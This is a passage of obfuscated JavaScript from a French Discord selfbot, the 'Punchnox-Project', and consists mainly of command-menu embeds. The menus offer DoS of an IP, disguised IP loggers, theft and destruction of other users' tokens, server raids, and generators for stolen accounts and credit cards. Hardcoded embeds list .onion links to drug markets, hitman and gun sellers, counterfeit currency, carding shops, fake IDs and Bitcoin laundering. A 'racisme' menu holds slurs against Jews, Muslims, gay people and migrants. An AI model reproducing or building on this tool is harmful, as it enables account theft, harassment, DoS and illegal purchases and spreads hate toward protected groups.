                          cs = new aw.RichEmbed().setTitle('** 「MENU NSFW」 **').setDescription('').addField('```𝗔𝘀𝘀```', '***Affiche du nsfw***').addField('```𝗽𝘂𝘀𝘀𝘆```', '***Affiche du nsfw***').addField('```𝗻𝘀𝗳𝘄-𝗴𝗶𝗳```', '***Affiche un gif nsfw***').addField('```𝗮𝗻𝗮𝗹```', '***Affiche du nsfw***').addField('```𝘁𝗵𝗶𝗴𝗵```', '***Affiche du nsfw***').addField('```𝟰𝗸```', '***Affiche une image nsfw en 4K***').addField('```𝗵𝗲𝗻𝘁𝗮𝗶```', '***Affiche un hentai***').addField('```𝗰𝘂𝗺```', '***Affiche du cum***').addField('```𝗻𝗲𝗸𝗼𝗹𝗲𝘄𝗱 ```', '***Affiche du nekolwd***').addField('```𝗹𝗲𝘀𝗯𝗶𝗮𝗻 ```', '***Affiche des lesbienes***').addField('```𝗯𝗼𝗼𝗯𝘀 ```', '***Affiche des boobs***').addField('```𝘁𝗶𝘁𝘀 ```', '***Affiche des tits***').addField('```𝗯𝗹𝗼𝘄𝗷𝗼𝗯 ```', '***Affiche blowjob***').addField('```𝘁𝗶𝗰𝗸𝗹𝗲 ```', '***Affiche du tickle***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                        if (cg.content === ab + 'nsfw') {
                          if (ag.includes('on')) {
                            cg.edit(cs);
                          } else cg.edit(cr);
                        }
                        if (cg.content === ab + 'gen') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU GEN」 **').setDescription('').addField(' ```𝗡𝗶𝘁𝗿𝗼``` ', '***gen un nitro random***').addField(' ```𝗠𝗲𝘁𝗮𝗹``` ', '***gen un metal dungeon***').addField(' ```𝗣𝘀𝗻``` ', '***gen un code psn random***').addField(' ```𝗫𝗯𝗼𝘅``` ', '***gen un code xbox random***').addField(' ```𝗚𝘀𝗽𝗼𝘁𝗶𝗳𝘆``` ', '***gen un spotify*** ' + cj).addField(' ```𝗡𝗼𝗿𝗱𝘃𝗽𝗻``` ', '***gen un nord vpn*** ' + cj).addField(' ```𝗨𝗽𝗹𝗮𝘆``` ', '***gen un uplay*** ' + cj).addField(' ```𝗽𝗼𝗿𝗻𝗵𝘂𝗯``` ', '***gen un pornhub*** ' + cj).addField(' ```𝗚𝘁𝗼𝗸𝗲𝗻``` ', '***drop un token pour spam (valid)*** ' + cj).addField(' ```𝗗𝗼𝗳𝘂𝘀``` ', '***gen un dofus*** ' + cj).addField(' ```𝗡𝗲𝘁𝗳𝗹𝗶𝘅``` ', '***gen un neflix uncheck*** ' + cj).addField(' ```𝗮𝗰𝗰𝘁𝗽𝘀𝗻``` ', '***gen un comtpe psn*** ' + cj).addField(' ```𝗥𝗮𝗻𝗱𝗼𝗺𝗰𝗼𝗹𝗼𝗿``` ', '***gen une couleur random***').addField(' ```𝗘𝗺𝗮𝗶𝗹``` ', '***gen une adresse gmail random***').addField(' ```𝗖𝗖``` ', '***gen un carte de crédit discord (ne pas payer de nitro sur son compte risque de ban)*** ' + cj).setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'hiddenwiki drugs')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** Hidden Wiki Drugs **').setDescription('>>> ***Marketplace Drugs*** \n http://rso4hutlefirefqp.onion \n / – EuCanna – Medical Grade Cannabis Buds, Rick Simpson Oil, Ointments and Creams \n http://newpdsuslmzqazvr.onion \n/ – Peoples Drug Store – The Darkweb’s Best Online Drug Supplier! \n http://smoker32pk4qt3mx.onion/\n– Smokeables – Finest Organic Cannabis shipped from the USA \n http://fzqnrlcvhkgbdwx5.onion/\n – CannabisUK – UK Wholesale Cannabis Supplier \n http://kbvbh4kdddiha2ht.onion/\n – DeDope – German Weed and Hash shop. (Bitcoin) \n http://s5q54hfww56ov2xc.onion/ \n– BitPharma – EU vendor for cocaine, speed, mdma, psychedelics and subscriptions \n http://ll6lardicrvrljvq.onion/ \n – Brainmagic – Best psychedelics on the darknet \n http://25ffhnaechrbzwf3.onion/ \n – NLGrowers – Coffee Shop grade Cannabis from the netherlands \n http://fec33nz6mhzd54zj.onion/index.php \n – Black Market Reloaded Forums \n http://atlmlxbk2mbupwgr.onion/ \n – Atlantis Marketplace Forums \n http://atlantisrky4es5q.onion/\n – Atlantis Marketplace \n http://dkn255hz262ypmii.onion/ – Silk Road Forums \n http://4yjes6zfucnh7vcj.onion/\n – Drug Market \n http://k4btcoezc5tlxyaf.onion/ \n – Kamagra for BitCoins \n http://silkroadvb5piz3r.onion/silkroad/home \n – Silk Road Marketplace \n http://5onwnspjvuk7cwvk.onion/').setImage('https://p0.storage.canalblog.com/03/53/1450433/110403700.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'hiddenwiki services')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** Hidden Wiki **').setDescription('>>> ***Hiddenwiki Commercial Services*** \n http://6w6vcynl6dumn67c.onion/ \n – Tor Market Board – Anonymous Marketplace Forums \n http://wvk32thojln4gpp4.onion/ \n – Project Evil \n http://5mvm7cg6bgklfjtp.onion/ \n – Discounted electronics goods \n http://lw4ipk5choakk5ze.onion/raw/evbLewgkDSVkifzv8zAo/ \n  – Unfriendlysolution – Legit hitman service \n http://nr6juudpp4as4gjg.onion/torgirls.html  \n – Tor Girls \n http://tuu66yxvrnn3of7l.onion/ \n  – UK Guns and Ammo \n http://nr6juudpp4as4gjg.onion/torguns.htm \n  – Used Tor Guns \n http://ucx7bkbi2dtia36r.onion/  \n – Amazon Business \n http://nr6juudpp4as4gjg.onion/tor.html \n  – Tor Technology \n http://hbetshipq5yhhrsd.onion/ \n  – Hidden BetCoin \n http://cstoreav7i44h2lr.onion/ \n  – CStore Carded Store \n http://tfwdi3izigxllure.onion/ – Apples 4 Bitcoin \n http://e2qizoerj4d6ldif.onion/ – Carded Store \n http://jvrnuue4bvbftiby.onion/  \n – Data-Bay \n http://bgkitnugq5ef2cpi.onion/ \n  – Hackintoshhttp://vlp4uw5ui22ljlg7.onion/ \n  – EuroArmshttp://b4vqxw2j36wf2bqa.onion/ \n  – Advantage Products \n http://ybp4oezfhk24hxmb.onion/  \n – Hitman Network \n http://mts7hqqqeogujc5e.onion/  \n – Marianic Technology Services \n http://mobil7rab6nuf7vx.onion/  \n – Mobile Store \n http://54flq67kqr5wvjqf.onion/ \n  – MSR Shop \n http://yth5q7zdmqlycbcz.onion/ \n  – Old Man Fixer’s Fixing Services \n http://matrixtxri745dfw.onion/neo/uploads/MATRIXtxri745dfwONION_130827231336IPA_pc.png \n  – PC Shop \n http://storegsq3o5mfxiz.onion/ \n  – Samsung Stor \n Ehttp://sheep5u64fi457aw.onion/  \n – Sheep Marketplace \n http://nr6juudpp4as4gjg.onion/betcoin.htm  \n – Tor BetCoin \n http://qizriixqwmeq4p5b.onion/  \n – Tor Web Developer \n http://vfqnd6mieccqyiit.onion/  \n – UK Passports \n http://en35tuzqmn4lofbk.onion/ \n  – US Fake ID Store \n http://xfnwyig7olypdq5r.onion/ \n  – USA Citizenship \n http://uybu3melulmoljnd.onion/ \n  – iLike Help Guy \n http://dbmv53j45pcv534x.onion/ \n  – Network Consulting and Software Development').setImage('https://p0.storage.canalblog.com/03/53/1450433/110403700.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'hiddenwiki forums')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** Hidden Wiki **').setDescription('>>> ***Forums and Chans*** \n http://2gxxzwnj52jutais.onion/phpbb/index.php \n – Onion Forum 2.0 renewed \n http://3fyb44wdhnd2ghhl.onion/ib/  \n – Onii-Chan \n http://bx7zrcsebkma7ids.onion  \n – Jisko \n http://npdaaf3s3f2xrmlo.onion/  \n – Twitter clone \n http://jv7aqstbyhd5hqki.onion  \n – HackBB – Hacking & cracking forum \n http://xdagknwjc7aaytzh.onion/20/http/1.4.7.9/forummain.htm  \n – Read only access to the Freenet FMS forums via the Anonet Webproxy \n http://sbforumaz7v3v6my.onion/ \n  – SciBay Forums \n http://kpmp444tubeirwan.onion/  \n – DeepWeb \n http://r5c2ch4h5rogigqi.onion/ \n  – StaTorsNet \n http://hbjw7wjeoltskhol.onion  \n – The BEST tor social network! File sharing, messaging and much more. Use a fake email to register. \n http://t4is3dhdc2jd4yhw.onion/ \n  – OnionForum 3.0 – New Onionforum for general talk, now with marketplace \n http://zw3crggtadila2sg.onion/imageboard/  \n – TorChan – One of the oldest chans on Tor').setImage('https://p0.storage.canalblog.com/03/53/1450433/110403700.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'hiddenwiki hacking')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** Hidden Wiki **').setDescription('>>> ***Hacking and Warez*** \n http://salted7fpnlaguiq.onion/\n – SALT \n http://yj5rbziqttulgidy.onion/\n – Itanimulli \n http://bbxdfsru7lmmbj32.onion/marketplace/ \n – Delta Initiative \n http://2ogmrlfzdthnwkez.onion/  \n – Rent-A-Hacker \n http://2gxxzwnj52jutais.onion/ \n  – The Nowhere Server (restored from backup after FH) \n http://jntlesnev5o7zysa.onion/ \n  – The Pirate Bay – Torrents \n http://am4wuhz3zifexz5u.onion/ \n  – Tor Library – library of books and other media files \n http://uj3wazyk5u4hnvtk.onion/ \n  – The Pirate Bay – Torrents (official .onion) \n http://doxbindtelxceher.onion/ – DOXBIN \n http://wuvdsbmbwyjzsgei.onion/ \n  – Music Downloads \n http://lolicore75rq3tm5.onion/ \n  – Lolicore and Speedcore Music \n http://xfmro77i3lixucja.onion/ \n – ebooks \n http://vt27twhtksyvjrky.onion/ \n  – lol 20th Century Western Music Recordings and Scores \n http://2ygbaoezjdmacnro.onion/ \n  – Pony at Noisebridge \n http://xfmro77i3lixucja.onion/ \n  – Imperial Library of Trantor \n http://c3jemx2ube5v5zpg.onion/ \n  – Jotunbane’s Reading Club').setImage('https://p0.storage.canalblog.com/03/53/1450433/110403700.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'hiddenwiki financial')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** Hidden Wiki **').setDescription('>>> ***Marketplace Financial*** \n http://torbrokerge7zxgq.onion/ \n  – TorBroker – Trade securities anonymously with bitcoin, currently supports nearly 1000 stocks and ETF \n http://fogcore5n3ov3tui.onion/ \n– Bitcoin Fog – Bitcoin Laundry \n http://2vx63nyktk4kxbxb.onion/ \n– AUTOMATED PAYPAL AND CREDIT CARD STORE \n http://samsgdtwz6hvjyu4.onion  \n Safe, Anonymous, Fast, Easy escrow service. \n http://easycoinsayj7p5l.onion/ \n– EasyCoin – Bitcoin Wallet with free Bitcoin Mixer \n http://jzn5w5pac26sqef4.onion/ \n– WeBuyBitcoins – Sell your Bitcoins for Cash (USD), ACH, WU/MG, LR, PayPal and more \n http://ow24et3tetp6tvmk.onion/ \n– OnionWallet – Anonymous Bitcoin Wallet and Bitcoin Laundry \n http://qc7ilonwpv77qibm.onion/ \n– Western Union Exploit \n http://3dbr5t4pygahedms.onion/ \n– ccPal Store \n http://y3fpieiezy2sin4a.onion/ \n– HQER – High Quality Euro Replicas \n http://qkj4drtgvpm7eecl.onion/ \n– Counterfeit USD \n http://nr6juudpp4as4gjg.onion/pptobtc.html \n  – PayPal to BitCoins \n http://nr6juudpp4as4gjg.onion/doublecoins.html \n – Double Your BitCoins \n http://lw4ipk5choakk5ze.onion/raw/4588/ \n – High Quality Tutorials').setImage('https://p0.storage.canalblog.com/03/53/1450433/110403700.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'hack')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let h6 = new aw.RichEmbed().setTitle('** 「MENU HACK」 **').setDescription('').setColor(ad).addField('```𝗗𝗼𝘀 + [ip]```', '***D0S une IP (vrais dos)(pas ddos)*** ' + cj).addField('```𝗶𝗽𝗹𝗼𝗴 + [lien]```', '***Envoie un IP logger cammouflé***').addField('```𝗚𝗲𝗼𝗶𝗽 + [Ip]```', '***Localise une ip***').addField('```𝗺𝗮𝗰 + [address mac]```', '***fais une recherche sur un address mac***').addField('```𝗥𝘁𝗼𝗸𝗲𝗻 + [mention]```', '***affiche un token*** ' + cj).addField('```𝗮𝗱𝗱𝗿𝗲𝘀𝘀 + [mention]```', '***génère une Adresse*** ' + cj).addField('```𝗩𝗶𝗿𝘂𝘀```', '***Creer un virus comme un h4x0r***').addField('```𝗗𝗗𝗼𝘀𝘃𝗼𝗰```', '***ddos la voc comme un vrais h4x0r***').addField('```𝗦𝘁𝗼𝗽𝗱𝗱𝗼𝘀𝘃𝗼𝗰```', '***stop le ddos voc***').addField('```𝗲𝗯𝗮𝘆𝘃𝗶𝗲𝘄 + {nombre} + {lien}```', '***ebay view bot*** ' + cj).addField('```pastebinview + {nombre} + {lien}```', '***pastebin view bot*** ' + cj).addField('```𝗰𝗿𝗲𝗮𝘁𝗲𝘄𝗲𝗯𝗵𝗼𝗼𝗸```', '***Créer un webhook***').addField('```𝗱𝗲𝗹𝘄𝗲𝗯𝗵𝗼𝗼𝗸 + {id} + {token}```', '***Supprime un webhook***').addField('```𝗶𝗻𝘃𝗶𝘁𝗲 + {id} ```', '***Créer une invite via l\'id du channel***').addField('```𝘁𝗼𝗸𝗲𝗻𝗰𝗵𝗲𝗰𝗸𝗲𝗿```', '***te dit si le token est valid***').addField('```𝗧𝗼𝗸𝗲𝗻𝗶𝗻𝗳𝗼```', '***Affiche les informations d\'un token (numero id pseudo nitro ou pas email, settings ect ect...)*** ' + cj).addField('```𝗧𝗼𝗸𝗲𝗻𝗳𝘂𝗰𝗸```', '***Détruit un token change le thème créer des servs fait clignoter le flash sur le portable de la victime change xla langue à l\'infini et change le status à l\'infini (fais crash le discord)*** ' + cj).addField('```𝗦𝗸𝘆𝗽𝗲```', '***Récupère une adresse ip via le pseudo skye***(peut ne pas marcher').addField('```𝗜𝗽𝘀𝗸𝘆𝗽𝗲```', '***Récupère tous les pseudos skype de l\'ip mentionnée***' + cj).addField('```𝗠𝗮𝗶𝗹𝘀𝗸𝘆𝗽𝗲```', '***Récupère toutes les informations des comptes Skype avec l\'émail mentionné***' + cj).addField('```𝗘𝘀𝗰𝗼𝗯𝗮𝗿```', '***Menu fait pour nos partenaires (escobar)***').setImage(bm).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(h6);
                          }
                        }
                        if (cg.content === ab + 'escobar') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('**「MENU ESCOBAR**').setDescription('menu pour remercier nos partenaires\ndiscord escobar : discord.gg/escobar').addField('```𝗽𝗵𝗼𝗻𝗲𝗹𝗼𝗼𝗸```', '***affiche les informations d\'un numéro (portable/fixe) (exemple /phonelook +336773485780)***').addField('```𝘀𝗺𝘀```', '***Reçoit les SMS de l\'heure écoulée. (Codes de pays: US)***' + cj).addField('```𝗻𝗺𝗮𝗽```', '***Effectue un scan nmap sur un adresse ip.(check les les ports)***').addField('```𝘀𝗰𝗮𝗻```', '***Effectue un scanv2 (check les les ports)***').addField('```𝗽𝗶𝗻𝗴𝗵```', '***ping 4 fois une adresse ip et dit le status (ms, en ligne...)***').addField('```𝗮𝗿𝗮𝗻𝗸```', '***Alexa rank. dit la position du site en fonction des visiteurs...***').addField('```𝘀𝗰𝗿𝗲𝗲𝗻```', '***screen une page web (https://google.com)***' + cj).addField('```𝘄𝗲𝗯𝗰𝗵𝗲𝗰𝗸```', '***check si le domaine mentionné est valid et en ligne***').addField('```𝗴𝗿𝗮𝗯𝗯𝗵𝗲𝗮𝗱𝗲𝗿```', '***grabb l\'headers du site mentionné' + cj + '***').addField('```𝘀𝗵𝗼𝗿𝘁𝘂𝗿𝗹```', '***réduit n\'importe quel url***').addField('```𝗴𝗲𝗻𝗶𝗻𝗳𝗼```', '***Gen des informations (nom, prénom, adresse, mail, sexe et autres ...***' + cj).addField('```𝘁𝗼𝗿𝗰𝗵𝗲𝗰𝗸```', '***Check le lien .onion mentionné (dit si il est valid et en ligne)***' + cj).addField('```𝗺𝗮𝗶𝗹𝗰𝗵𝗲𝗰𝗸```', '***Check si l\'émail mentionné est jetable ou non***').addField('```𝘁𝗲𝘅𝘁𝗶𝗺𝗮𝗴𝗲```', '***Récupère le text qui est dans une image et le dit sous forme d\'embed***').addField('```𝗽𝗿𝗼𝘅𝗶𝗲𝘀 {http/https/socks4/socks5}```', '***drop 100 proxies entièrement valid***' + cj).addField('```𝗱𝗽𝗿𝗼𝘅𝗶𝗲𝘀```', '***check si (l\'ip) mentionnée est un proxie ou non***').addField('```𝗴𝗲𝘁𝗶𝗽```', '***Récupère l\'adresse ip du domaine mentionné (exemple getip google.com)***').addField('```𝗶𝗽𝗴𝗲𝘁```', '***Récupère le nom de domaine de l\'ip mentionné***').addField('```𝘄𝗵𝗼𝗶𝘀```', '***Fais une analyse avec whois (ip domaine...)***').setColor(ad).setThumbnail('https://i.pinimg.com/originals/85/d9/f6/85d9f650d0f545e6e71c9d3e2a313453.gif').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content === ab + 'escobar') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().addField('```𝘀𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻```', '***Effectue une analyse avancée des sous-domaines pour trouver la plupart des sous-domaines du domaine mentionné***').addField('```𝗿𝗲𝗽𝘂𝗰𝗵𝗲𝗰𝗸```', '***Vérifie si un site/url spécifique est suspect et peut contenir des logiciels malveillants, du phishing ou d\'autres logiciels potentiellement dangereux.***' + cj).addField('```𝘄𝗲𝗯𝗯𝗮𝗰𝗸𝘂𝗽```', '***Effectue une backup en ligne du site mentionné***' + cj).addField('```𝗶𝗺𝗴𝗹𝗼𝗼𝗸```', '***Inverse l\'image donnée et détermine ce qu\'il y a dessus.***').addField('```𝘆𝘁𝗺𝗽𝟯```', '***Télécharge la vidéo youtube donnée en mp3.***' + cj).setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'systeme')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU SYSTEME」 **').setDescription('').addField(' ```𝗿𝗲𝗽𝗼𝗿𝘁 + {message/beug...}``` ', '***Permets de signaler un beug ou une erreur à punchnox et le staff du projet***').addField(' ```𝗯𝗹𝗮𝗰𝗸𝗹𝗶𝘀𝘁 + {id de l\'utilisateur et raison de la demande}``` ', '***Permets de signaler un membre pour demander une blacklist (abus de commande raid...)***').addField(' ```𝘀𝗲𝘁𝗽𝗿𝗲𝗳𝗶𝘅``` ', '***Change le prefix du selfbot***').addField(' ```𝘀𝗲𝘁𝗶𝗺𝗮𝗴𝗲``` ', '***Remplace l\'image des embeds***').addField(' ```𝗱𝗲𝗹𝗶𝗺𝗮𝗴𝗲``` ', '***Supprime l\'image des embeds***').addField(' ```𝘀𝗲𝘁𝗰𝗼𝗹𝗼𝗿``` ', '***Change la couleur des embeds***').addField(' ```𝘀𝗲𝘁𝘁𝘄𝗶𝘁𝗰𝗵``` ', '***Change le lien twitch***').addField(' ```𝗱𝗮𝗿𝗸``` ', '***Change vôtre theme discord en sombre***').addField(' ```𝗹𝗶𝗴𝗵𝘁``` ', '***Change vôtre theme discord en claire***').addField(' ```𝗹𝗶𝘀𝘁𝗲𝗴𝘂𝗶𝗹𝗱``` ', '***Affiche tous les serveurs de ton compte***').addField(' ```𝗱𝗶𝘀𝗰𝗼𝗿𝗱``` ', '***Affiche la version de ton discord***').addField(' ```𝗡𝗯𝘀𝗲𝗿𝘃𝗲𝘂𝗿``` ', '***Affiche le nombre de serveurs sur le compte***').addField(' ```𝗡𝗯𝗯𝗼𝘁``` ', '***Affiche le nombre de bots sur les serveurs du le compte***').addField(' ```𝗡𝗯𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀``` ', '***Affiche le nombres de channels sur les serveurs du compte***').addField(' ```𝗡𝗯𝘂𝘀𝗲𝗿𝘀``` ', '***Affiche le nombres d\'utilisateurs sur les serveurs du compte***').addField(' ```𝗽𝗹𝗮𝘁𝗲𝗳𝗼𝗿𝗺𝗲``` ', '***Affiche sur quel plateforme vous utilisez le selfbot***').addField(' ```𝗺𝘆𝗶𝗻𝗳𝗼``` ', '***Affiche les informations de ton compte***').addField(' ```𝗶𝗻𝗳𝗼𝘀``` ', '***Affiche les stats de ton compte et pc (cpu, ram, a2f?, verif, nb, users, bot...***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'verif')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var ct = new aw.RichEmbed().setColor(ad).setDescription('***𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐮𝐞 𝐬𝐮𝐫 𝐥𝐞 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝐒𝐞𝐥𝐟𝐛𝐨𝐭 ! ***').setImage('https://cdn.discordapp.com/attachments/708383271284768838/710942768406593596/20200515_215214.png').setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 **logo by : ** 人ᴴᵒʷ人𝑺𝕦𝒌𝒂#8240', cg.author.avatarURL);
                            cg.channel.send(ct);
                          }
                        }
                        if (cg.content.includes(ab + 'racisme')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var ct = new aw.RichEmbed().setColor(ad).setTitle('**vive l\'humour noir**').addField('```𝗷𝘂𝗶𝗳𝗲𝗱```', '***juifed***').addField('```𝗺𝘂𝘀𝘂𝗹𝗺𝗮𝗻```', '***musulman***').addField('```𝗱𝗽𝗱```', '***AAAAAAAAA des pd***').addField('```𝗺𝗶𝗴𝗿𝗮𝗻𝘁```', '***c\'est quoi ça ? des migrants?***').setImage(bm).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(ct);
                          }
                        }
                        if (cg.content.includes(ab + 'hbackup')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU BACKUP」 **').setDescription('').addField('```𝗯𝗮𝗰𝗸𝘂𝗽 𝗰𝗿𝗲𝗮𝘁𝗲```', '***Créé une backup d\'un serveur***').addField('```𝗯𝗮𝗰𝗸𝘂𝗽 𝗹𝗼𝗮𝗱 : (𝗶𝗱)```', '***Charge une backup***').addField('```𝗯𝗮𝗰𝗸𝘂𝗽 𝗽𝘂𝗿𝗴𝗲```', '***Surppime toutes les backups***').addField('```𝗯𝗮𝗰𝗸𝘂𝗽 𝗱𝗲𝗹𝗲𝘁𝗲 : (𝗶𝗱)```', '***Surppime une backup***').addField('```𝗯𝗮𝗰𝗸𝘂𝗽 𝗶𝗻𝗳𝗼 : (𝗶𝗱)```', '***Envoie les informations d\'une backup***').addField('```𝗯𝗮𝗰𝗸𝘂𝗽 𝗹𝗶𝘀𝘁𝗲```', '***Affiche la liste de vos backups***').addField('```𝗯𝗮𝗰𝗸𝘂𝗽-𝗳```', '***Créé une backup de ta liste d\'amis dans un hastebin (pseudo,#,id)*** ' + cj).setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'gameperso')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU GAMEPERSO **').setDescription('').addField('```𝗮𝗻𝗶𝗺𝗲𝟭 + {msg}```', '***status anime1*** ' + cj).addField('```𝗮𝗻𝗶𝗺𝗲𝟮 + {msg}```', '***status anime2***').addField('```𝗮𝗻𝗶𝗺𝗲𝟯 + {msg}```', '***status anime3***').addField('```𝘀𝘁𝗶𝗰𝗸𝗼𝘀 + {msg}```', '***status stickos***').addField('```𝗵𝘂𝗻𝘁𝗲𝗿 + {msg}```', '***status Hunter x Hunter***').addField('```𝗯𝗶𝘁𝗰𝗼𝗶𝗻 + {msg}```', '***status btc***').addField('```𝗯𝗹𝗮𝗰𝗸-𝗰𝗹𝗼𝘃𝗲𝗿 + {msg}```', '***status black-clover***').addField('```𝘀𝗿𝗲𝘁𝗿𝗼𝟭 + {msg}```', '***status retro1*** ' + cj).addField('```𝘀𝗿𝗲𝘁𝗿𝗼𝟮 + {msg}```', '***status retro2***').addField('```𝘀𝗿𝗲𝘁𝗿𝗼𝟯 + {msg}```', '***status retro2***').addField('```𝗦𝗡𝗲𝗸𝗼 + {msg}```', '***status Neko***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        var cu = new aw.RichEmbed().setTitle('Tu n\'as pas le premium').setDescription('vous devez avoir le premium pour effectuer cette commande`' + ab + 'hpremium pour plus d\'infos`').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                        if (cg.content.includes(ab + 'premium')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cq = new aw.RichEmbed().setTitle('** 「PREMIUM」 **').setDescription('```💲 𝙩𝙪 𝙚𝙨 𝘾𝙚𝙧𝙩𝙞𝙛𝙞𝙚  𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙥𝙖𝙧 𝙋𝙐𝙉𝘾𝙃𝙉𝙊𝙓 💲```').setImage('https://images-ext-1.discordapp.net/external/LGYmHY9ZwQyo708qWJ3G6nZxHmowzIi1IHlqiADaO9U/https/media.giphy.com/media/mCmuV5DlZiREevUgt3/giphy.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(cq);
                              var cv = new aw.RichEmbed().setDescription('**Raison pour laquelle vous avez le premium : **\n```diff\n-' + raison + '\n```').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.channel.send(cv);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'hpremium') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('「COMMANDS PREMIUM」').addField('**「INFOS PREMIUM」**', 'la version premium du punchnox project coute 5 euros vous pouvez vous rendre sur ce serveur et contacter le fondateur pour plus d\'informations \n serveur: ' + ba).addBlankField().addField('**Status**\n', '*MultiStream \n Ytb \n rpc \n Twitter \n Spotiy \n sretro1 \n anime1* \n').addField('**Hack**\n', '*adress \n dos \n rtoken \n ebayview \n tokeninfo \n tokenfuck\nipskype\nmailskype\n*').addField('**Escobar**\n', '*\n sms \n screen \n grabbheader \n geninfo \n torcheck \n proxies \n repucheck \n webbackup \n ytmp3*').addField('**Fun**\n', '*8ball \n graff \n neon \n beach \n neoneffect \n noel \n blood \n led \n light \n retro \n phcomment \n imagecaptcha \n trumptweet \n invert \n chatbot \n didyoumean \n randomname \n ps4 \n brazzers \n crush*\n').addField('**Raid**\n', '*guilddelete \n spam \n stopspam \n banall \n allkick \n del*\n').addField('**Tools**\n', '*robpp \n myip \n newtoken \n checkhost \n sond \n qrcode \n changehypesquad \n dm \n firstmessage \n empty \n binaireencode \n binairedecode \n defautall \n mastercard\n Farmxp \n stopfarmxp*').addField('**Moderation**\n', '*Antiaidon \n Antiraidoff \n warn \n banid*\n').addField('**Gen**\n', '*Gspotify \n nordvpn \n uplay \n pornhub \n gtoken \n dofus \n netflix \n pulsar\n cc*\n').addField('**Backups**\n', '*backup-f \n webbackup*\n').setColor(ad).setThumbnail(cg.author.avatarURL).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content === ab + 'leave') {
                          if (cg.author.id === aN.user.id) {
                            if (!cg.guild) return command.edit('𝙇𝙖 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙣\'𝙚𝙨𝙩 𝙪𝙩𝙞𝙡𝙞𝙨𝙖𝙗𝙡𝙚 𝙦𝙪𝙚 𝙙𝙖𝙣𝙨 𝙡𝙚𝙨 𝙨𝙚𝙧𝙫𝙚𝙪𝙧𝙨.');
                            cg.guild.leave().then(() => {}).catch(() => {
